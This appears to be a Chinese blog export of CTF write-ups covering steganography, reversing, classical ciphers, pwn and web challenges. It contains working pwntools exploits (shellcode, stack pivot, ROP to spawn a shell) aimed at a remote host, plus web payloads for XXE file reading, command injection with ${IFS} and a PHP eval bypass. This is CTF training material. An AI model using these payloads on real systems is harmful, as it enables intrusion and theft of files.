</ul>
<pre><code>flag{5oiR54ix6buE6I6J6I2D}</code></pre><hr>
<h4 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h4><ul>
<li><p><strong>题目描述</strong>：</p>
<p>老烟枪</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>图片隐写术</li>
</ul>
<hr>
</li>
<li><p><strong>难度</strong></p>
<p>​    ★</p>
</li>
</ul>
<hr>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p>binwalk分离,或者手工分离</p>
<pre><code>binwalk -e 666.jpg</code></pre><ul>
<li><strong><em>flag</em></strong></li>
</ul>
<pre><code>flag{WW91IGxvb2sgc2VyaW91cywgbGlrZSBDYWkgWHVrdW4u}</code></pre><hr>
<h4 id="抓黑客"><a href="#抓黑客" class="headerlink" title="抓黑客"></a>抓黑客</h4><ul>
<li><p><strong>题目描述</strong>：</p>
<p>某学校服务器遭受到黑客入侵，管理员及时保留了服务器日志，已知黑客在服务器增加了一个root权限的用户，请你通过日志审计找出该用户第一次登陆的用户名、时间和ip，flag格式：</p>
<p>用户名+时间+ip</p>
<p>如:xiaoming+12:00+127.0.0.1</p>
<hr>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>日志审计</li>
</ul>
<hr>
</li>
<li><p><strong>难度</strong></p>
<p>​    ★</p>
</li>
</ul>
<hr>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p>直接搜索“Accepted  ”即可找出登陆成功的用户信息：</p>
<pre><code>grep &quot;Accepted &quot; auth.log | awk &#39;{print $1,$2,$3,$9,$11}&#39;</code></pre><ul>
<li><strong><em>flag</em></strong></li>
</ul>
<pre><code>  mysq1+10:34:30+172.16.5.143</code></pre><hr>
<h4 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>小明女神给他发了个文件，他却不知道如何打开你能帮助他吗？</p>
</li>
<li><p><strong>考点</strong></p>
<pre><code>- zip伪加密
- PNG高度隐藏</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<pre><code>★★☆</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>解题思路</strong></p>
<p>解除伪加密，爆破高度</p>
</li>
</ul>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="Baby-reverse"><a href="#Baby-reverse" class="headerlink" title="Baby reverse"></a>Baby reverse</h4><ul>
<li><strong>题目描述</strong></li>
</ul>
<ul>
<li><p><strong>考点</strong></p>
<pre><code>- IDA操作</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<p>​    ☆</p>
</li>
</ul>
<hr>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-fa8065abde7d9b40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>利用ida的字符串搜索功能找出flag</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-f5a7141ceb72f742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<hr>
<p><strong><em>flag</em></strong></p>
<pre><code>flag{reverse_is_easy}</code></pre><h4 id="Easy-reverse"><a href="#Easy-reverse" class="headerlink" title="Easy reverse"></a>Easy reverse</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>​    简单的运算</p>
</li>
<li><p><strong>考点</strong></p>
<pre><code>- ida反编译的使用</code></pre><ul>
<li>简单的算法逆向</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<pre><code>★</code></pre></li>
</ul>
<hr>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-5da98a549a598124.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>主要算法，将输入的字符串异或0xC在加1</p>
<p>解密脚本:</p>
<pre><code>key = &quot;kanlxvdzTljyTfyTeuor&quot;
flag=&quot;&quot;
for i in key:
    flag += chr((ord(i)-1)^0xC)
print flag    </code></pre><p><img src="https://upload-images.jianshu.io/upload_images/18296851-9eb3e0b5d7383593.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<h4 id="霸王别姬"><a href="#霸王别姬" class="headerlink" title="霸王别姬"></a>霸王别姬</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>小明要煮个鳖顿乌鸡汤，不知道壳怎么脱</p>
</li>
<li><p><strong>考点</strong></p>
<pre><code>- 脱壳</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<pre><code>★★</code></pre></li>
</ul>
<hr>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-04bbe8ab8d4b9df8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-5821b27b933bf33c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-77ff363733f24f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>加壳后的文件函数和逻辑都被隐藏</p>
<p>考点:识辨upx加壳，并且手动或工具脱掉upx加壳</p>
<h6 id="解法一-工具脱壳"><a href="#解法一-工具脱壳" class="headerlink" title="解法一 工具脱壳"></a>解法一 工具脱壳</h6><p><img src="https://upload-images.jianshu.io/upload_images/18296851-f325294d7567d609.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-a1a752da78c15615.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>脱壳后即可看到flag</p>
<h6 id="解法二-ESP定律法"><a href="#解法二-ESP定律法" class="headerlink" title="解法二 ESP定律法"></a>解法二 ESP定律法</h6><p>OD载入</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-f54a4c8536dcc697.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>发现ESP突变</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-616ac3f9cabae0f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>右键esp,选择数据窗口跟随</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-07dd648345c5232b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>选择数据窗口的第一个数据，右键选择硬件访问，断下硬件断点，运行。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-0273733a1743d162.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>发现大跳转，即为进入OEP</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-d8acb2f0589e43fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>用OD自带的插件脱壳</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-1e9a2ee419633291.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>将脱壳后的文件放入ida中，虽然upx没有脱干净，但是可以看到程序的主要函数以及隐藏的flag</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-42e06fc8b1de92a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<hr>
<h4 id="电竞选手"><a href="#电竞选手" class="headerlink" title="电竞选手"></a>电竞选手</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>听说CTF选手常用WASD？</p>
</li>
<li><p><strong>考点</strong></p>
<pre><code>- 逆向</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<pre><code>★★★★</code></pre></li>
</ul>
<hr>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p>将程序用ida载入查看逻辑</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-44987ccd12b4c976.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>发现关键的判断句，当两个函数返回为1时则输入值为flag，首先看sub_401350函数</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-68ebb4461b0934ed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>sub_40145A函数</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-1f3b123f126b50cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<p>迷宫</p>
<pre><code>##....####
##.##.###.
##.##.###.
...##.###.
.####.....
.####.#.##
.####...##
....######
###.###+##
###.....##</code></pre><p>走完迷宫到达+的位置即为flag</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18296851-ee4a6991ac2931e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
<hr>
<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h4 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>恺撒将军使用了一种技术运筹帷幄，指挥千里将士决胜千里。</p>
<p>敌军正好截获了一串密文:<code>]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@</code></p>
<p>offset: 3</p>
</li>
<li><p><strong>考点</strong></p>
<pre><code>- 凯撒密码
- base64解码</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<pre><code>★★</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>解题思路</strong></p>
<p>加密算法:将给定的flag中的每个字符后移3位，并将偏移后的字符串base64编码</p>
<p>加密脚本:</p>
<pre><code class="python">flag = &quot;flag{crypto_is_hxb_so_eAsy0}&quot;

result = flag.encode(&quot;base64&quot;)

print result

encode_flag = &quot;&quot;

for i in result:
    encode_flag += chr((ord(i)+3)%128)

print encode_flag</code></pre>
<p>解密脚本:</p>
<pre><code class="python">result=&quot;]p{k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;

flag=&quot;&quot;

for i in result:
    flag += chr(ord(i)-3)

print flag.decode(&quot;base64&quot;)</code></pre>
</li>
</ul>
<h4 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>小明家菜园要建栅栏，请教了他心爱的女神，女神给了这么点提示，他却看不懂，你能帮助他吗？：</p>
<p>f_tnluz_aghggeao{t_oy_ldoia}</p>
</li>
<li><p><strong>考点</strong></p>
<pre><code>- 栅栏密码</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<pre><code>★★</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>解题思路</strong></p>
<p>由于栅栏数较小，因此不给出栅栏数提示，可以用网上的栅栏密码解密或手写脚本爆破栅栏数解密</p>
<p>加密脚本:</p>
</li>
</ul>
<pre><code>flag = &quot;flag{yo_uget_itzha_lan_good}&quot;

#flag{yo _uget_i tzha_la n_good}

k = 7 

flag {yo_ uget _itz ha_l an_g ood}

f_tn

encode_flag=&quot;&quot;



for i in range(7):
    for j in range(4):
        encode_flag += flag[j*7+i]

print encode_flag</code></pre><p>​    解密脚本:</p>
<pre><code>
encode_flag = &quot;f_tnluz_aghggeao{t_oy_ldoia}&quot;

for k in range(1,29):
    flag=&quot;&quot;
    num = 28/k
    for i in range(k):
        for j in range(num):
            flag += encode_flag[j*k+i]
    if &quot;flag&quot; in flag:
        print &quot;k:&quot;+str(28/k)+&quot;\n&quot;+&quot;flag:\n&quot;+flag+&quot;\n&quot;
</code></pre><h4 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h4><ul>
<li><p>描述：</p>
<p>我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码：</p>
</li>
</ul>
<pre><code>密文：
jivsyisgmlirgbggvuocevsivnsoevszotfloymivnmozwgitmbyfevtgugvffecgmflgtglimbggvjgmmuocevsivnijofcotgsoevsklgvflgkotjnkimmfejjhohyjifgnbwlyvfgtsiflgtgtmmcijjfeslfjwqvefstoyhmngrgjohgnflgetokvhiffgtvmozmhggulevnghgvngvfozgiuloflgtmocgjivsyisggdhgtfmbgjegrgflifwgitmisoklgvflgkotjnlinxymfzergfofgvcejjeovhgohjgflgwmhoqghgtlihmjivsyisgmbgfkggvflgcmoovizfgtkitnmcivwozflomghgohjgmfitfgnmgffjevsnokvfobguocgzitcgtmivnflgetjivsyisgmfoobguicgcotgmgffjgnivnzgkgtevvycbgtevtgugvfugvfytegmftingevnymfteijemifeovflgngrgjohcgvfozflgvifeovmfifgivnflgmhtginozyvergtmijuochyjmotwgnyuifeovgmhgueijjwsjobijemifeovivnbgffgtuoccyveuifeovmevflghimfzgknguingmijjlirguiymgncivwjivsyisgmfonemihhgitivnnocevivfjivsyisgmmyulimgvsjemlmhivemlivnulevgmgitgevutgimevsjwfiqevsorgtifhtgmgvfflgkotjnlimiboyfjivsyisgmflgnemftebyfeovozflgmgjivsyisgmemlysgjwyvgrgvflgsgvgtijtyjgemflifcejnpovgmlirgtgjifergjwzgkjivsyisgmozfgvmhoqgvbwcivwhgohjgklejglofkgfpovgmlirgjofmozfgvmhoqgvbwmcijjvycbgtmgytohglimovjwitoyvnjivsyisgmflgicgteuimiboyfizteuiivnimeiivnflghiuezeuhgtlihmozkleulhihyivgksyevgiijovgiuuoyvfmzotkgjjorgtflgcgneivvycbgtozmhgiqgtmemcgtgkleulfliflijzflgkotjnmjivsyisgmitgmhoqgvbwzgkgthgohjgflivflifijtginwkgjjorgtozflgfofijozjivsyisgmitgujomgfogdfevufeovkeflovjwizgkgjngtjwmhgiqgtmjgzfheuqiftivnocbymyyevuicgtoovgeslftgcievevsmhgiqgtmuleihivguoevcgdeuojehivihiulgevflgyvefgnmfifgmfkootfltggotkinxesyeviymftijeiovgkefliaygmfeovcitqvovgozflgmgmggcmfolirgcyululivugozmytrerij
明文：
Languages have been coming and going for thousands of years, but in recent times there has been less coming and a lot more going. When the world was still populated by hunter-gatherers，small，tightly knit(联系)groups developed their own patterns of speech independent of each other. Some language experts believe that 10,000 years ago, when the world had just five to ten million people, they spoke perhaps 12, 000 languages between them.Soon afterwards, many of those people started settling down to become farmers, and their languages too became more settled and fewer in number. In recent centuries, trade, industrialisation, the development of the nation-state and the spread of universal compulsory education, especially globalisation and better communications in the past few decades, all have caused many languages to disappear, and dominant languages such as English，Spanish and Chinese are increasingly taking over.At present, the world has about 6, 800 languages. The distribution of these languages is hugely uneven. The general rule is that mild zones have relatively few languages, often spoken by many people, while hot wet zones have lots, often spoken by small numbers. Europe has only around 200 languages; the Americas about 1, 000; Africa 2, 400; and Asia and the Pacific perhaps 3,200, of which Papua New Guinea alone accounts for well over 800.The median number(中位数) of speakers is mere 6,000, which that half the world&#39;s languages are spoken by fewer people than that.Already well over 400 of the total of 6, 800 languages are close to extinction (消亡), with only a few elderly speakers left. Pick, at random, Busuu in Cameroon （eight remaining speakers), Chiapaneco in Mexico (150), Lipan Apache in the United States (two or three) or Wadjigu in Australia (one, with a question-mark): none of these seems to have much chance of survival</code></pre><p>待解密文：</p>
<pre><code>givfome</code></pre><ul>
<li><p>解题过程</p>
<ul>
<li><p>进行字频统计得出如下结果</p>
<pre><code>e =&gt;g
a =&gt;i
n =&gt;v
t =&gt;f
o =&gt;o
s =&gt;m
i =&gt;e
r =&gt;j
l =&gt;t
h =&gt;l
u =&gt;y
d =&gt;s
g =&gt;h
p =&gt;n
c =&gt;u
m =&gt;c
f =&gt;z
w =&gt;k
y =&gt;b
v =&gt;w
k =&gt;r
c =&gt;q
p =&gt;d
t =&gt;p
x =&gt;x
j =a</code></pre></li>
</ul>
</li>
<li><p>加密脚本</p>
</li>
</ul>
<pre><code class="python">table = [&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;]
s = &quot;eantosi&quot;
m = &quot;&quot;
for i in s:
    k=0
    for j in table:
        i = i.lower()
        if j == i:
            l =(19*k+18)%26    
            m = m + table[l]
            break
        else:
            k = k+1    
print(m)</code></pre>
<p><strong><em>flag</em></strong></p>
<pre><code>flag{eantosi}</code></pre><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>nc 139.199.10.70 10003</p>
</li>
<li><p><strong>考点</strong></p>
<pre><code>- shellcode</code></pre></li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<pre><code>★★</code></pre></li>
</ul>
<hr>
<ul>
<li>题目源码</li>
</ul>
<pre><code class="C">#include &lt;stdio.h&gt;
  #include &lt;unistd.h&gt;

  int main()
  {
      setbuf(stdin, 0);
      setbuf(stdout, 0);
      setbuf(stderr, 0);
      printf(&quot;欢迎参加海啸杯?\n&quot;);
      printf(&quot;你听说过shellcode嘛?\n&quot;);
      printf(&quot;input:\n&quot;);
      read(0, shellcode, 1023);
      (*(void (*)()) shellcode)();
  }
  #flag{7aa4aa9d-bb79-48e8-860a-266cf870a8ff}</code></pre>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p>直接输入一段字符，并且作为函数调用这段字符，由于题目保护全关，因此输入一段shellcode即可获得shell</p>
<p>解题脚本:</p>
<pre><code>from pwn import *

#sh = process(&quot;./shellcode&quot;)

sh = remote(&quot;139.199.10.70&quot;,10003)

shellcode = asm(shellcraft.sh()) #输入一段shellcode

sh.sendline(shellcode)

sh.interactive()
</code></pre><p><strong><em>flag</em></strong></p>
<pre><code>flag{7aa4aa9d-bb79-48e8-860a-266cf870a8ff}</code></pre><hr>
<h4 id="simple-stackoverflow"><a href="#simple-stackoverflow" class="headerlink" title="simple_stackoverflow"></a>simple_stackoverflow</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>nc 139.199.10.70 10004</p>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>shellcode</li>
<li>栈转移</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<p>★★★</p>
</li>
</ul>
<hr>
<ul>
<li>题目源码</li>
</ul>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int overflow()
{
    char buf[24];
    read(0, buf, 1023);
    return 0;
}

int main()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    overflow();
}

#flag{5fa84896-6696-4d3f-a85c-41d0de6a5515}</code></pre>
<ul>
<li><strong>解题思路</strong></li>
</ul>
<p>题目一样保护全关，但是输入shellcode后却不知道shellcode的返回地址，因此需要将栈转移，将栈转移到.bss段写下shellcode并返回到.bss段调用shellcode得到shell</p>
<p>解题脚本:</p>
<pre><code class="python">from pwn import *

#sh = process(&quot;./simple_stackoverflow2&quot;)

sh = remote(&quot;139.199.10.70&quot;,10004)

bss_address =  0x804a040

shellcode = asm(shellcraft.sh())

payload = &quot;a&quot;*(0x20+4)  + p32(0x08048390)+p32(bss_address) + p32(0) + p32(bss_address) + p32(len(shellcode)) 

sh.sendline(payload)

#time.sleep(1)

sh.send(shellcode)

sh.interactive()
</code></pre>
<p><strong><em>flag</em></strong></p>
<pre><code>flag{5fa84896-6696-4d3f-a85c-41d0de6a5515}</code></pre><hr>
<h4 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h4><ul>
<li><p><strong>题目描述</strong></p>
<p>nc 139.199.10.70 10007</p>
</li>
<li><p><strong>考点</strong></p>
<ul>
<li>ROP</li>
<li>系统调用好 int0x80</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p><strong>难度</strong></p>
<p>★★★★</p>
</li>
</ul>
<hr>
<ul>
<li>题目源码</li>
</ul>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

char *shell = &quot;/bin/sh&quot;;

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf(&quot;This time, no system() and NO SHELLCODE!!!\n&quot;);
    printf(&quot;What do you plan to do?\n&quot;);
    gets(buf);

    return 0;
}
</code></pre>
<p><strong>解题思路</strong></p>
<p>题目没有system的地址，但通过ROPgadget可以知道eax,ebx,edx,ecx与int 0x80的地址，因此选择使用系统调用int 0x80 相当于执行execuve(“/bin/sh”)获取shell 此时eax的值为0xb,ebx的值为”/bin/sh”的地址，ecx,edx的值为0</p>
<p>解题脚本:</p>
<pre><code class="python">from pwn import *

#sh = process(&quot;./rop&quot;)

sh = remote(&quot;139.199.10.70&quot;,10007)

ppp_dcb_address = 0x0806eb90

p_eax = 0x080bb196 

bin_sh_address = 0x080be408

int_0x80_address = 0x08049421

payload = &#39;a&#39;*(112) + p32(p_eax) + p32(0xb) + p32(ppp_dcb_address) + p32(0)+ p32(0) + p32(bin_sh_address) + p32(int_0x80_address)

time.sleep(4)

sh.sendline(payload)

sh.interactive()

#flag{48cddff6-994e-409e-bb27-7b7366454253}</code></pre>
<ul>
<li><strong><em>flag</em></strong></li>
</ul>
<pre><code>flag{48cddff6-994e-409e-bb27-7b7366454253}</code></pre>]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020-Can you guess it?</title>
    <url>//articles/d4f73bcb62.html</url>
    <content><![CDATA[<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><pre><code class="php">&lt;?php
include &#39;config.php&#39;; // FLAG is defined in config.php

if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) {
  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
}

if (isset($_GET[&#39;source&#39;])) {
  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST[&#39;guess&#39;])) {
  $guess = (string) $_POST[&#39;guess&#39;];
  if (hash_equals($secret, $guess)) {
    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
  } else {
    $message = &#39;Wrong.&#39;;
  }
}
?&gt;</code></pre>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从源码得知flag在config.php中的一个常量中，要得到flag需要我们post一个值guess和随机生成的要预测和爆破基本没戏。但是可以发现 <code>highlight_file()</code> 里面的变量是可控的。那么我们可以看看<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code> 怎么才能得到我们想要的结果。我们从php.net可以得知：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200520150428.png" alt="微信图片_20200520150428"></p>
<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 能够当前url的路径，而basename能够返回返回路径中文件名部分。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154155.png" alt="微信截图_20200520154155"></p>
<p>那我们不是可以传入<code>/index.php/config.php?souce</code> ？但是一条正则挡住了我们的去路：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154339.png" alt="微信截图_20200520154339"></p>
<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p>我们还需要绕过</p>
<pre><code class="php">preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></pre>
<p>这种正则其实直接写个脚本去爆破即可，一般都是某个字符能够通过。</p>
<pre><code class="python">import requests

for i in range(0,255):
    url=&quot;http://c3bedc5a-4535-41a4-9c5f-9a25eae15489.node3.buuoj.cn/index.php/config.php/%s?source&quot;%(chr(i))
    r = requests.get(url)
    if &#39;flag&#39; in r.text:
        print(r.text)
</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200520154931.png" alt="微信截图_20200520154931"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>NSCTF Write Up By Gzmtu Sec</title>
    <url>//articles/d5133a9cdb.html</url>
    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="小明又被拒绝了"><a href="#小明又被拒绝了" class="headerlink" title="小明又被拒绝了"></a>小明又被拒绝了</h3><p>这题比较简单，xff+改cookie</p>
<p>payload:</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190910/15680897504108.png" alt="img"></p>
<h3 id="XX"><a href="#XX" class="headerlink" title="XX?"></a>XX?</h3><ul>
<li><p><strong>源码泄露</strong></p>
</li>
<li><p><a href="http://119.61.19.212:8083/index.php" target="_blank" rel="noopener">http://119.61.19.212:8083/index.php</a>~</p>
<pre><code class="php">&lt;?php
#鍏抽棴Warning
error_reporting(E_ALL^E_NOTICE^E_WARNING);

$xmlfile = file_get_contents(&#39;php://input&#39;);
$dom = new DOMDocument();
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);

$creds = simplexml_import_dom($dom);
$user = $creds-&gt;user;
$pass = $creds-&gt;pass;

echo &quot;CTF:&quot; . &quot;&lt;br&gt;&quot; . &quot;$user&quot;;
?&gt;
</code></pre>
</li>
<li><p>xxe直接打，另外扫描到flag.php</p>
</li>
<li><p><img src="http://goodcheerleung.gitee.io/mycute/20190910/1568090057222.png" alt="img"></p>
</li>
<li><p>PHP伪协议直接读flag</p>
<pre><code class="shell">GET /index.php HTTP/1.1
Host: 119.61.19.212:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: admin=0
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
Content-Length: 227
</code></pre>
</li>
</ul>
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" ><p>]&gt;<br><creds><br><user>&xxe;</user><br><pass>&xxe;</pass><br></creds></p>
<pre><code>
![img]( http://goodcheerleung.gitee.io/mycute/20190910/15680912975437.png)

### 免费的,ping一下~

- Fuzz出来一个payload`a;id;`可以用

![img]( http://goodcheerleung.gitee.io/mycute/20190910/15680918202057.png)

-  ${IFS}绕过空格
-  pyload
</code></pre><p>baidu.coma;grep${IFS}-n${IFS}”fl”${IFS}/fla*; </p>
<pre><code>
### php

```php
&lt;?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
function GetYourFlag(){
    echo file_get_contents(&quot;./flag.php&quot;);
}

if(isset($_GET[&#39;code&#39;])){
    $code = $_GET[&#39;code&#39;];
    //print(strlen($code));
    if(strlen($code)&gt;27){ 
        die(&quot;Too Long.&quot;);
    }

    if(preg_match(&#39;/[a-zA-Z0-9_&amp;^&lt;&gt;&quot;\&#39;]+/&#39;,$_GET[&#39;code&#39;])) {
        die(&quot;Not Allowed.&quot;);
    }
    @eval($_GET[&#39;code&#39;]);
}else{
      highlight_file(__FILE__);
}
?&gt;</code></pre><ul>
<li>这道题和SUCTF2019的Ezphp类似。</li>
<li>直接使用脚本检测在这个正则下哪些字符可用。</li>
</ul>
<pre><code class="php">&lt;?php
for ($ascii = 0; $ascii &lt; 256; $ascii++) {
    if (!preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, chr($ascii))) {
    //echo bin2hex(chr($ascii));
    echo chr($ascii);
    echo &quot;\n&quot;;
}
}
?&gt;</code></pre>
<ul>
<li>可以得知如下字符可用</li>
</ul>
<pre><code>! # $ % ( ) * + , - . / : ; = ? @ [ \ ] ` { | } ~  </code></pre><ul>
<li><p>构造payload，直接构造${_GET}{%a0();,绕过方法参考：<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186298.html</a></p>
</li>
<li><pre><code class="php">&gt;&gt;echo bin2hex(~(&quot;_GET&quot;));
&gt;&gt;a0b8baab
转换为url编码再取反构造payload如下：
${~%a0%b8%ba%ab}{%a0}();&amp;%a0=GetYourFlag
</code></pre>
<p>读取flag</p>
</li>
<li><pre><code>&lt;?php
$flag=&quot;flag{3904c5df2e894ca02a21004feb21e617}&quot;
?&gt;</code></pre></li>
</ul>
<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><ul>
<li>扫描目录从胡发现有个api目录，然后需要我们post提交一个filename而且是json格式的。经过一顿Fuzz出来一个<code>payload</code>可用：</li>
</ul>
